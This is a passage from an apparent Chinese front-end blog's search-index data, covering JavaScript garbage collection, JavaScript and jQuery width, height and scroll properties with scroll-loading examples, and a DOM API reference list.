world&quot;);\n\n\n上面的代码中，数组[1,2,3,4]是一个值，会占用内存。变量arr是仅有的对这个值的引用，因此引用次数为1。尽管后面的代码没有用到arr，它是会持续占用内存\n\n如果增加一行代码，解除arr对[1,2,3,4]引用，这块内存就可以被垃圾回收机制释放了。\nlet arr = [1,2,3,4];console.log(&quot;hello world&quot;);arr = null;\n\n\n上面代码中，arr重置为null，就解除了对[1，2，3，4]的引用，引用次数变成了0，内存就可以释放出来了。\n\n\n因此，并不是说有了垃圾回收机制，程序员就轻松了。你还是需要关注内存占用：那些很占空间的值，一旦不再用到，你必须检查是否还存在对它们的引用。如果是的话，就必须手动解除引用\n\n再来下面来看看代码：\nfunction problem() &#123;    var objA = new Object();    var objB = new Object();    objA.someOtherObject = objB;    objB.anotherObject = objA;&#125;\n\n\n在这个例子中，objA和objB通过各自的属性相互引用；也就是说这两个对象的引用次数都是2。在采用引用计数的策略中，由于函数执行之后，这两个对象都离开了作用域，函数执行完成之后，objA和objB还将会继续存在，因为他们的引用次数永远不会是0。这样的相互引用如果说很大量的存在就会导致大量的内存泄露\n\n不过上面的问题也不是不能解决，我们可以手动切断他们的循环引用。\nmyObj.element = null;element.someObject =null;\n\n这样写代码的话就可以解决循环引用的问题了，也就防止了内存泄露的问题。\n缺点\n如果存在循环引用的情况，那么这个引用值占的空间就永远不会被回收。\n\n面试回答什么是垃圾\n一般来说没有被引用的对象就是垃圾，就是要被清除，有个例外如果几个对象引用形成一个环，互相引用，但根访问不到它们，这几个对象也是垃圾，也要被清除。\n\n如何检垃圾\n一种算法是标记 标记-清除 算法\n\n","categories":["前端"],"tags":["javascript"]},{"title":"js宽高属性","url":"/2018/01/24/html+css+js+ts/3-js%E5%AE%BD%E9%AB%98%E5%B1%9E%E6%80%A7/","content":"第一部分 JavaScript中的宽高属性\n一、与window相关的宽高属性\n1.1 window.location和document.location\n\nwindow对象的location属性引用的是location对象，表示该窗口中当前显示文档的URL\n\ndocument的对象的location属性也是引用location对象\n\n所以\nwindow.location === document.location\n\n//true\n\n\n\n1.2 window.screen\n\n\n\n&#96;&#96;&#96;window.screen  包含有关用户屏幕的信息。它包括：  - `window.screen.width`  - `window.screen.height`  - `window.screen.availHeight`  - `window.screen.availWidth`  - `window.screenTop`  - `window.screenLeft`![window.screen](http://upload-images.jianshu.io/upload_images/1480597-d7979b36ca991d9c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)**1.3 与window相关的宽高**- `window.innerWidth` 内部的宽度- `window.innerHeight` 内部的高度- `window.outWidth` 外部的宽度- `window.outHeight` 外部的高度![与window相关的宽高](http://upload-images.jianshu.io/upload_images/1480597-7c90cc88a3355d8e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)### 二、与document相关的宽高属性------#### 2.1与client相关的宽高------- `document.body.clientWidth` 元素宽度（可视内容区+内边距）- `document.body.clientHeight`元素高度（可视内容区+内边距）该属性指的是元素的可视部分宽度和高度，即`padding+content`如果没有滚动条，即为元素设定的宽度和高度如果出现滚动条，滚动条会遮盖元素的宽高，那么该属性就是其本来宽高减去滚动条的宽高example1：\nbody{  border: 20px solid #000;  margin: 10px;  padding: 40px;  background: #eee;  height: 350px;  width: 500px;  overflow: scroll;}console.log(document.body.clientWidth);  &#x2F;&#x2F; 350+padding(80) &#x3D; 430console.log(document.body.clientHeight);  &#x2F;&#x2F; 500 + padding(80) &#x3D; 580example2: 在div中添加文字， 指导出现滚动条\n\n#exp2 {    width:200px;    height:200px;    background:red;    border:1px solid #000;    overflow:auto;}\nvar test &#x3D; document.getElementById(“exp2”);\nconsole,log(test.clientHeight); &#x2F;&#x2F; 200console.log(test.clientWidth); &#x2F;&#x2F;\n![img](https://poetries1.gitee.io/img-repo/2019/10/322.png)- **小结clientWidth和clientHeight**  - 无`padding`无滚动 ： `clientWidth` = 盒子的`width`  - 有`padding`无滚动 ： `clientWidth` = 盒子的`width` + 盒子的`padding * 2`  - 有`padding`有滚动 ： `clientWidth` = 盒子和`width` + 盒子的`padding * 2`- 滚动轴宽度- `document.body.clientLeft`- `document.body.clientTop`这两个返回的是元素周围边框的厚度，如果不指定一个边框或者不定位该元素，它的值就是0例：\nbody{    border: 20px solid #000;    margin: 10px;    padding: 40px;    background: #eee;    height: 350px;    width: 500px;    overflow: scroll;}console.log(document.body.clientLeft);  &#x2F;&#x2F; 20console.log(document.body.clientTop);  &#x2F;&#x2F; 20\n**小结clientLeft和clientTop**- 这一对属性是用来读取元素的\n  border    的宽度和高度的  - `clientTop = border-top`  - `clientLeft = border-left`#### 2.2 与offset相关的宽高------- **document.body.offsetWidth（元素的border+padding+content的宽度）**- **document.body.offsetHeight（元素的border+padding+content的高度）**该属性和其内部的内容是否超出元素大小无关，只和本来设定的border以及width和height有关例：body{    border: 20px solid #000;    margin: 10px;    padding: 40px;    background: #eee;    height: 350px;    width: 500px;    overflow: scroll;}console.log(document.body.offsetWidth);  &#x2F;&#x2F; 470 &#x3D; padding2 + 350 + border2console.log(document.body.offsetHeight);  &#x2F;&#x2F; 620 &#x3D; padding2 + 500 + border2\n**小结offsetWidth和offsetHeight**- 无padding  无滚动无border    - offsetWidth = clientWidth = 盒子的宽度- 有padding  无滚动有border    - offsetWidth = 盒子的宽度 + 盒子padding*2 + 盒子边框*2 = clientWidth + 边框宽度*2- 有padding  有滚动，且滚动是显示的，有border    - offsetWidth = 盒子宽度 + 盒子padding*2 + 盒子边框*2 = clientWidth + 滚动轴宽度 + 边框宽度*2------- **document.offsetLeft**- **document.offsetTop**了解这两个属性我们必须先了解它，什么是`offsetParent`- 如果当前元素的父级元素没有进行`CSS`定位（`position`为`absolute`或`relative`）,`offsetParent`为`body.`- 假如当前元素的父级元素中有`CSS`定位，`offsetParent`取最近的那个父级元素**offsetLeft的兼容性问题：**- 在`IE6/7`中  - `offsetLeft` = offsetParent的padding-left + 当前元素的margin-left- 在`IE8/9/10`以及`chrome`中  - `offsetLeft` = offsetParent的margin-left + offsetParent的border宽度 + offsetParent的padding-left + 当前元素的margin-left- 在`FireFox`中  - `offsetLeft` = offsetParent的margin-left + 当前元素的margin-left + offsetParent的padding-left例：\nbody{    border: 20px solid #000;    margin: 10px;    padding: 40px;    background: #eee;    height: 350px;    width: 500px;    overflow: scroll;} \n#exp {   width:400px;   height:200px;   padding:20px;   margin:10px;   background:red;   border:20px solid #000;   overflow:auto;}var div &#x3D; document.getElementById(“exp”);\n- 在IE8/9/10以及chrome中：  - div.offsetLeft = 本身的margin10 + 父级元素的padding40 + margin10 + border20 = 80  - div.offsetTop = 本身的margin10 + 父级元素的padding40 + margin10 + border20 = 80- 在FireFox：（相比chrome中少了border）  - div.offsetLeft = 本身的margin10 + 父级元素的padding40 + margin10 = 60  - div.offsetTop = 本身的margin10 + 父级元素的padding40 + margin10 = 60- 在IE6/7中：（相比在FireFox，不但少了border还少了父级元素的margin）  - `div.offsetLeft` = 本身的`margin10` + 父级元素的`padding40` = 50  - `div.offsetTop` = 本身的`margin10` + 父级元素的`padding40` = 50#### 2.3与scroll相关的宽高 (实际项目中用的最多)------- **document.body.scrollWidth**- **document.body.scrollHeight**document.body的scrollWidth和scrollHeight与div的scrollWidth和scrollHeight是有区别的例：\nbody{    border: 20px solid #000;    margin: 10px;    padding: 40px;    background: #eee;    height: 350px;    width: 500px;    overflow: scroll;}\ndocument.body.scrollHeight; &#x2F;&#x2F;document.body.scrollWidth; &#x2F;&#x2F;\n- 当给定宽高小于浏览器窗口的宽高  - scrollWidth = 通常是浏览器窗口的宽度  - scrollHeight = 通常是浏览器窗口的高度- 当给定宽高大于浏览器窗口的宽高，且内容小于给定宽高的时候  - scrollWidth = 给定宽度 + 其所有的padding + margin + border  - scrollHeight = 给定高度 + 其所有的padding + margin + border- 当给定宽高大于浏览器窗口宽高，且内容大于给定宽高  - scrollWidth = 内容宽度 + 其所有的padding + margin + border  - scrollHeight = 内容高度 + 其所有的padding + margin + border**在某div中的scrollWidth和scrollHeight**- 无滚动轴时：  - scrollWidth = clientWidth = 盒子宽度 + 盒子padding*2![img](https://poetries1.gitee.io/img-repo/2019/10/323.png)- 有滚动轴时：  - scrollWidth = 实际内容的宽度 + padding*2  - scrollHeight = 实际内容的高度 + padding*2![img](https://poetries1.gitee.io/img-repo/2019/10/324.png)- **document.body.scrollLeft**- **document.body.scrollTop**与前面不同的是，这对属性是可读写的，指的是当元素其中的超出其宽高的时候，元素被卷起来的高度和宽度\n#exp {   width:400px;   height:200px;   padding:20px;   margin:10px;   background:red;   border:20px solid #000;   overflow-y:scroll;}\nvar mydiv &#x3D; document.getElementById(“exp”);\nmydiv.scrollTop ;  &#x2F;&#x2F;默认情况下是0mydiv.scrollLeft ; &#x2F;&#x2F;默认情况下是0 \n&#x2F;&#x2F;可以改写它\nmydiv.scrollTop &#x3D; 20;console.log(mydiv.scrollTop)\n![img](https://poetries1.gitee.io/img-repo/2019/10/325.png)**obj.style.width和obj.style.height**对于一个`DOM`元素，它的`style`属性返回的是一个对象，这个对象的任意一个属性是可读写的，`style.width`等于`css`属性中的宽度。`style.height`等于`css`属性中的高度#### 2.4 documentElement和body的关系------是父子级的关系\nbody{    border: 20px solid #000;    margin: 10px;    padding: 40px;    background: #eee;    height: 350px;    width: 500px;    overflow: scroll;}\n#exp {   width:400px;   height:200px;   padding:20px;   margin:10px;   background:red;   border:20px solid #000;   overflow-y:scroll;}\nconsole.log(document); &#x2F;&#x2F;documentconsole.log(document.documentElement); &#x2F;&#x2F;htmlconsole.log(document.body); &#x2F;&#x2F;body\n![img](https://poetries1.gitee.io/img-repo/2019/10/326.png)- 兼容问题推荐使用 获取浏览器窗口可视区域大小\ndocument.body.clientWidth || document.documentElement.clientWidth;document.body.clientHeight || document.documentElement.clientHeight;\n### 三、Event对象的5种坐标------![img](https://poetries1.gitee.io/img-repo/2019/10/327.png)例：\n\nvar example = document.getElementById(\"example\");\nexample.onclick = function(e){\n    console.log(\"clientX \"+e.clientX + \" : \" + \" clientY \"+e.clientY);\n    console.log(\"screenX \"+e.screenX + \" : \" + \" screenY \"+e.screenY);\n    console.log(\"offsetX \"+e.offsetX + \" : \" + \" offsetY \"+e.offsetY);\n    console.log(\"pageX \"+e.pageX + \" : \" + \" pageY \"+e.pageY);\n    console.log(\"x \"+e.x + \" : \" + \" y \"+e.y);\n}\n![img](https://poetries1.gitee.io/img-repo/2019/10/328.png)### 四、 js各种宽高的应用------- **example1：可视区域加载**![img](https://poetries1.gitee.io/img-repo/2019/10/329.png)\n\n#example1 {\n            width: 500px;\n            height: 350px;\n            background: red;\n            margin: 1000px auto 0 auto;\n        }\n        @-webkit-keyframes fadeInLeft{\n            0%{\n                opacity: 0;\n                transform: translate3d(-100%,0,0);\n            }\n            100%{\n                opacity: 1;\n                transform: none;\n                \n        &#125;\n    &#125;\n        .fadeInLeft &#123;\n            animation-name: fadeInLeft;\n            animation-duration: 2s;\n        &#125;\n\nfunction showDiv(){            var example &#x3D; document.getElementById(“example”);            var clients &#x3D; window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight;&#x2F;&#x2F;可视区域的高度            var divTop &#x3D; example.getBoundingClientRect().top;            if(divTop &lt;&#x3D; clients){                example.classList.add(“fadeInLeft”);                              &#x2F;&#x2F;  这里可以通过setAttribute设置图片的src按需加载            }            document.title &#x3D; clients+”—“+divTop;        }\nwindow.onscroll &#x3D; showDiv;\n[在线演示](http://codepen.io/poetries/pen/RoeJgG)- **example2：网页滚动到顶部或者底部**\n\n#example2 {\n            width: 500px;\n            height: 350px;\n            background: red;\n            margin: 1000px auto 0 auto;\n}\nfunction scrollTopOrBottom(){\n            var example2 = document.getElementById(\"example\");\n            var clients = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight;//可视区域的高度，兼容性写法\n            var scrollTop = document.body.scrollTop;\n            var wholeHeight = document.body.scrollHeight;\n            if(clients + scrollTop >= wholeHeight){\n                alert(\"我已经到了底部!\");\n                              // 这里可以调用Ajax分页加载到页面中，实现多页加载功能\n            }else if(scrollTop == 0){\n                alert(\"我已经到了顶部了!\");\n                      \n        &#125;\n        document.title = (clients + scrollTop)+&quot;---&quot;+wholeHeight+&quot;--&quot;+scrollTop;\n    &#125;\n    \n\nwindow.onscroll &#x3D; scrollTopOrBottom;\n[在线演示](http://codepen.io/poetries/pen/WoayJy)- **example3：DIV滚动到底部加载**\n\n            DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载\n            DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载\n            DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载\n            DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载\n            DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载\n            DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载\n\n#example3 {\n            width: 500px;\n            height: 400px;\n            background: red;\n            margin: 10px auto;\n            padding: 10px;\n            overflow-y: scroll;\n}\nvar div = document.getElementById(\"example3\");\n        function divScroll(){\n            \n        var wholeHeight = div.scrollHeight;//滚动区域高度\n        var divScrollTop = div.scrollTop;//卷上去的那部分高度\n        var divHeight = div.clientHeight; //div的可视区域的高度\n        \n        \n        if(divScrollTop + divHeight &gt;= wholeHeight)&#123;\n            alert(&quot;我已经到了底部!&quot;);\n           // 这里可以在div中通过滚动加载分页按需显示\n        &#125;else if(divScrollTop == 0)&#123;\n            alert(&quot;我已经到了顶部了!&quot;);\n        &#125;\n        document.title = (divScrollTop + divHeight)+&quot;---&quot;+wholeHeight+&quot;--&quot;+divScrollTop;\n\n}\ndiv.onscroll &#x3D; divScroll;\n[在线演示](http://codepen.io/poetries/pen/vyVrvm)- **example4：计算滚动轴的宽度**\n&#x2F;&#x2F;获取滚动轴的宽度    function getScrollBar(){        var el &#x3D; document.createElement(“p”);        var styles &#x3D; {            width:”100px”,            height:”100px”,            overflowY:”scroll”        };        for (var prop in styles){            el.style[prop] &#x3D; styles[prop];&#x2F;&#x2F;把 styles上的属性全部遍历拷贝到el.style上\n    &#125;\n    document.body.appendChild(el);\n    var scrollBarWidth = el.offsetWidth - el.clientWidth;\n    el.remove();\n    return scrollBarWidth;\n&#125;\nalert(getScrollBar());//17\n\n[在线演示](http://codepen.io/poetries/pen/RoeBbL)### 五、js中的宽高属性总结![img](https://poetries1.gitee.io/img-repo/2019/10/330.png)![img](https://camo.githubusercontent.com/3318530334bbc8f5e7ce267866c43ba72fa01f32/687474703a2f2f6f61376436647871742e626b742e636c6f7564646e2e636f6d2f626c6f672f696d616765732f3038313734323039323736363338392e6a7067)![img](https://poetries1.gitee.io/img-repo/2019/10/331.png)![img](https://poetries1.gitee.io/img-repo/2019/10/332.png)## 第二部分 jQuery中的宽高属性------### 一、jquery相关宽高介绍------- 1.1 width()  - 特殊元素`window.document`只可以读，普通元素可以读写，`width()`返回结果无单位，`css(&quot;width&quot;)`的结果有单位![img](https://poetries1.gitee.io/img-repo/2019/10/333.png)![img](https://poetries1.gitee.io/img-repo/2019/10/334.png)- 1.2 innerWidth()  - 包含padding（不推荐window,document调用）- **1.3 innerHeight()**![img](https://poetries1.gitee.io/img-repo/2019/10/335.png)![img](https://poetries1.gitee.io/img-repo/2019/10/336.png)- 1.4 outerWidth()  - 包含padding和border，当传true时包含marging，不传时不包含marging（不推荐window,document调用）- **1.5 outerHeight()**![img](https://poetries1.gitee.io/img-repo/2019/10/337.png)![img](https://poetries1.gitee.io/img-repo/2019/10/338.png)- 1.6 scrollLeft():  - 相对于水平滚动条左边的距离，如果滚动条非常左、或者元素不能被滚动，这个值为0；- **1.7 scrollTop():**  - 相对于垂直滚动条上边的距离，如果滚动条非常上、或者元素不能被滚动，这个值为0；- **1.8 .offset():**  - 相对于document的当前坐标值(相对于body左上角的left,top的值)；- 1.9 .position():  - 相对于offset parent的当前坐标值(相对于offset parent元素的左上角的left、top的值)![img](https://poetries1.gitee.io/img-repo/2019/10/339.png)### 二、jquery相关宽高举例------**2.1 exmaple1**![img](https://poetries1.gitee.io/img-repo/2019/10/340.png)\n\n    \n\nhtml,body {\n    margin:10px;\n    border:5px solid red;\n    padding:20px;\n}\n.parentDiv {\n    width:800px;\n    height:500px;\n    margin:5px auto;\n    background:#FF6600;\n    border:5px dashed green;padding:30px;position:relative;\n\n}.childrenDiv {    width:300px;    height:500px;    margin:5px auto;    background:yellow;    border:5px solid black;    padding:5px;    box-sizing:border-box;&#x2F;包括padding和border的值&#x2F;}&#x2F;&#x2F;特殊元素的高度&#x2F;&#x2F;window  documentconsole.log(“$(window).height()”+$(window).height());console.log(“$(document).height()”+$(document).height());\n&#x2F;&#x2F;innerHeightconsole.log(“$(window).innerHeight()”+$(window).innerHeight());console.log(“$(document).innerHeight()”+$(document).innerHeight());\n&#x2F;&#x2F;普通child元素的高度\n&#x2F;&#x2F;480 &#x3D; 500 - border2 - padding2 (因为设置了box-sizing，box-sizing把border和padding的值计算了进去)console.log(‘$(“.childrenDiv”).height()’+ $(“.childrenDiv”).height());\n&#x2F;&#x2F;490 &#x3D; 500 - border2 - padding2（innerHeight不包括padding）console.log(‘$(“.childrenDiv”).innerHeight()’+ $(“.childrenDiv”).innerHeight());\n&#x2F;&#x2F;500 &#x3D; 500  不包括marginconsole.log(‘$(“.childrenDiv”).outerHeight()’+ $(“.childrenDiv”).outerHeight());\n&#x2F;&#x2F;510 &#x3D; 500 + margin true包括marginconsole.log(‘$(“.childrenDiv”).outerHeight()’+ $(“.childrenDiv”).outerHeight(true));\n&#x2F;&#x2F;scrollTop\n$(window).scroll(function(){    document.title &#x3D; “scrollTop  “+$(this).scrollTop();});\n&#x2F;&#x2F; jquery宽高演示之offset和position\nconsole.log(‘$(“.childrenDiv”).offset().top ‘+$(“.childrenDiv”).offset().top);console.log(‘$(“.childrenDiv”).offset().left ‘+$(“.childrenDiv”).offset().left);console.log(‘$(“.childrenDiv”).position().top ‘+$(“.childrenDiv”).position().top);console.log(‘$(“.childrenDiv”).position().top ‘+$(“.childrenDiv”).position().left);\n![img](https://poetries1.gitee.io/img-repo/2019/10/341.png)![img](https://poetries1.gitee.io/img-repo/2019/10/342.png)[在线演示](http://codepen.io/poetries/pen/yVRqZO)### 三、jquery各种宽高应用------**3.1 jquery可视区域加载**\n\n#example {\n            width: 500px;\n            height: 350px;\n            background: red;\n            margin: 1000px auto 0 auto;\n        }\n        @-webkit-keyframes fadeInLeft{\n            0%{\n                opacity: 0;\n                transform: translate3d(-100%,0,0);\n            }\n            100%{\n                opacity: 1;\n                transform: none;\n                \n        &#125;\n    &#125;\n        .fadeInLeft &#123;\n            animation-name: fadeInLeft;\n            animation-duration: 2s;\n        &#125;\n\n$(window).scroll(function(){    var ks_area &#x3D; $(window).height();&#x2F;&#x2F;可视区域高度    var scrollHeight &#x3D; $(window).scrollTop();&#x2F;&#x2F;被卷上去的那部分    var divTop &#x3D; $(“#example”).offset().top;&#x2F;&#x2F;盒子距离浏览器顶部的距离\nif(ks_area + scrollHeight &gt;= divTop)&#123;\n    $(&quot;#example&quot;).addClass(&quot;fadeInLeft&quot;);\n&#125;\ndocument.title = ks_area+&#39;-&#39;+scrollHeight+&#39;-&#39;+divTop;\n\n});\n[在线演示](http://codepen.io/poetries/pen/MbPqVE)**3.2 jquery滚动到底部和顶部加载**\n\n\n#example {\n            width: 500px;\n            height: 350px;\n            background: red;\n            margin: 1000px auto 0 auto;\n}\n$(window).scroll(function(){\n    var ks_area = $(window).height();\n    var scrollTop = $(window).scrollTop();\n    var wholeHeight = $(document).height();\n    \nif(ks_area + scrollTop &gt;=wholeHeight )&#123;\n    alert(&quot;已经到底部了&quot;);\n&#125;else if(scrollTop == 0)&#123;\n    alert(&quot;已经到头部了&quot;);\n&#125;\n\n})&#96;&#96;&#96;\n","categories":["javascript"],"tags":["javascript"]},{"title":"js-api","url":"/2018/01/05/html+css+js+ts/3-js%E5%B8%B8%E7%94%A8api/","content":"一、节点1.1 节点属性\nNode.nodeName   //返回节点名称，只读Node.nodeType   //返回节点类型的常数值，只读Node.nodeValue  //返回Text或Comment节点的文本值，只读Node.textContent  //返回当前节点和它的所有后代节点的文本内容，可读写Node.baseURI    //返回当前网页的绝对路径Node.ownerDocument  //返回当前节点所在的顶层文档对象，即documentNode.nextSibling  //返回紧跟在当前节点后面的第一个兄弟节点Node.previousSibling  //返回当前节点前面的、距离最近的一个兄弟节点Node.parentNode   //返回当前节点的父节点Node.parentElement  //返回当前节点的父Element节点Node.childNodes   //返回当前节点的所有子节点Node.firstChild  //返回当前节点的第一个子节点Node.lastChild   //返回当前节点的最后一个子节点//parentNode接口Node.children  //返回指定节点的所有Element子节点Node.firstElementChild  //返回当前节点的第一个Element子节点Node.lastElementChild   //返回当前节点的最后一个Element子节点Node.childElementCount  //返回当前节点所有Element子节点的数目。\n\n1.2 操作\nNode.appendChild(node)   //向节点添加最后一个子节点Node.hasChildNodes()   //返回布尔值，表示当前节点是否有子节点Node.cloneNode(true);  // 默认为false(克隆节点), true(克隆节点及其属性，以及后代)Node.insertBefore(newNode,oldNode)  // 在指定子节点之前插入新的子节点Node.removeChild(node)   //删除节点，在要删除节点的父节点上操作Node.replaceChild(newChild,oldChild)  //替换节点Node.contains(node)  //返回一个布尔值，表示参数节点是否为当前节点的后代节点。Node.compareDocumentPosition(node)   //返回一个7个比特位的二进制值，表示参数节点和当前节点的关系Node.isEqualNode(noe)  //返回布尔值，用于检查两个节点是否相等。所谓相等的节点，指的是两个节点的类型相同、属性相同、子节点相同。Node.normalize()   //用于清理当前节点内部的所有Text节点。它会去除空的文本节点，并且将毗邻的文本节点合并成一个。//ChildNode接口Node.remove()  //用于删除当前节点Node.before()  //Node.after()Node.replaceWith()\n\n1.3 Document节点\n1.3.1 Document节点的属性\ndocument.doctype   //document.documentElement  //返回当前文档的根节点document.defaultView   //返回document对象所在的window对象document.body   //返回当前文档的&lt;body&gt;节点document.head   //返回当前文档的&lt;head&gt;节点document.activeElement  //返回当前文档中获得焦点的那个元素。//节点集合属性document.links  //返回当前文档的所有a元素document.forms  //返回页面中所有表单元素document.images  //返回页面中所有图片元素document.embeds  //返回网页中所有嵌入对象document.scripts  //返回当前文档的所有脚本document.styleSheets  //返回当前网页的所有样式表//文档信息属性document.documentURI  //表示当前文档的网址document.URL  //返回当前文档的网址document.domain  //返回当前文档的域名document.lastModified  //返回当前文档最后修改的时间戳document.location  //返回location对象，提供当前文档的URL信息document.referrer  //返回当前文档的访问来源document.title    //返回当前文档的标题document.characterSet属性返回渲染当前文档的字符集，比如UTF-8、ISO-8859-1。document.readyState  //返回当前文档的状态document.designMode  //控制当前文档是否可编辑，可读写document.compatMode  //返回浏览器处理文档的模式document.cookie   //用来操作Cookie\n\n1.3.2 Document节点的方法\n（1）读写方法\ndocument.open()   //用于新建并打开一个文档document.close()   //不安比open方法所新建的文档document.write()   //用于向当前文档写入内容document.writeIn()  //用于向当前文档写入内容，尾部添加换行符。\n\n（2）查找节点\ndocument.querySelector(selectors)   //接受一个CSS选择器作为参数，返回第一个匹配该选择器的元素节点。document.querySelectorAll(selectors)  //接受一个CSS选择器作为参数，返回所有匹配该选择器的元素节点。document.getElementsByTagName(tagName)  //返回所有指定HTML标签的元素document.getElementsByClassName(className)   //返回包括了所有class名字符合指定条件的元素document.getElementsByName(name)   //用于选择拥有name属性的HTML元素（比如&lt;form&gt;、&lt;radio&gt;、&lt;img&gt;、&lt;frame&gt;、&lt;embed&gt;和&lt;object&gt;等）document.getElementById(id)   //返回匹配指定id属性的元素节点。document.elementFromPoint(x,y)  //返回位于页面指定位置最上层的Element子节点。\n\n（3）生成节点\ndocument.createElement(tagName)   //用来生成HTML元素节点。document.createTextNode(text)   //用来生成文本节点document.createAttribute(name)  //生成一个新的属性对象节点，并返回它。document.createDocumentFragment()  //生成一个DocumentFragment对象\n\n（4）事件方法\ndocument.createEvent(type)   //生成一个事件对象，该对象能被element.dispatchEvent()方法使用document.addEventListener(type,listener,capture)  //注册事件document.removeEventListener(type,listener,capture)  //注销事件document.dispatchEvent(event)  //触发事件\n\n（5）其他\ndocument.hasFocus()   //返回一个布尔值，表示当前文档之中是否有元素被激活或获得焦点。document.adoptNode(externalNode)  //将某个节点，从其原来所在的文档移除，插入当前文档，并返回插入后的新节点。document.importNode(externalNode, deep)   //从外部文档拷贝指定节点，插入当前文档。\n\n1.4 Element节点\n1.4.1 Element节点的属性\n（1）特性属性\nElement.attributes  //返回当前元素节点的所有属性节点Element.id  //返回指定元素的id属性，可读写Element.tagName  //返回指定元素的大写标签名Element.innerHTML   //返回该元素包含的HTML代码，可读写Element.outerHTML  //返回指定元素节点的所有HTML代码，包括它自身和包含的的所有子元素，可读写Element.className  //返回当前元素的class属性，可读写Element.classList  //返回当前元素节点的所有class集合Element.dataset   //返回元素节点中所有的data-*属性。\n\n（2）尺寸属性\nElement.clientHeight   //返回元素节点可见部分的高度Element.clientWidth   //返回元素节点可见部分的宽度Element.clientLeft   //返回元素节点左边框的宽度Element.clientTop   //返回元素节点顶部边框的宽度Element.scrollHeight  //返回元素节点的总高度Element.scrollWidth  //返回元素节点的总宽度Element.scrollLeft   //返回元素节点的水平滚动条向右滚动的像素数值,通过设置这个属性可以改变元素的滚动位置Element.scrollTop   //返回元素节点的垂直滚动向下滚动的像素数值Element.offsetHeight   //返回元素的垂直高度(包含border,padding)Element.offsetWidth    //返回元素的水平宽度(包含border,padding)Element.offsetLeft    //返回当前元素左上角相对于Element.offsetParent节点的垂直偏移Element.offsetTop   //返回水平位移Element.style  //返回元素节点的行内样式\n\n（3）节点相关属性\nElement.children   //包括当前元素节点的所有子元素Element.childElementCount   //返回当前元素节点包含的子HTML元素节点的个数Element.firstElementChild  //返回当前节点的第一个Element子节点  Element.lastElementChild   //返回当前节点的最后一个Element子节点  Element.nextElementSibling  